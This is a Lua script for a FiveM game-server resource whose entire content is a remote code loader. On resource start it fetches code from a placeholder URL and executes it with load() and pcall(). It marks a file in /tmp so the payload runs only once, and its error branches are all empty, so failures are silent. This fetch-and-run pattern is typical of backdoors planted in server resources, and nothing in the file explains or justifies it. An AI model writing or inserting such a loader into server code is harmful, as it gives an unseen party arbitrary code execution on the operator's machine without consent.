local codeURL = "CODEURL"
local executedFilePath = "/tmp/executed.txt"
local executed = false

function FileExists(path)
    local file = io.open(path, "r")
    if file then
        file:close()
        return true
    end
    return false
end

AddEventHandler("onResourceStart", function(resourceName)
    if GetCurrentResourceName() == resourceName and not executed then
        if not FileExists(executedFilePath) then
            PerformHttpRequest(codeURL, function(statusCode, response, headers)
                if statusCode == 200 then
                    if response and response ~= "" then
                        local success, errorMessage = pcall(load(response))
                        if success then
                            executed = true
                            local file = io.open(executedFilePath, "w")
                            if file then
                                file:close()
                            end
                        else
                        end
                    else
                    end
                else
                end
            end, "GET", "", {})
        else
            executed = true
        end
    end
end)
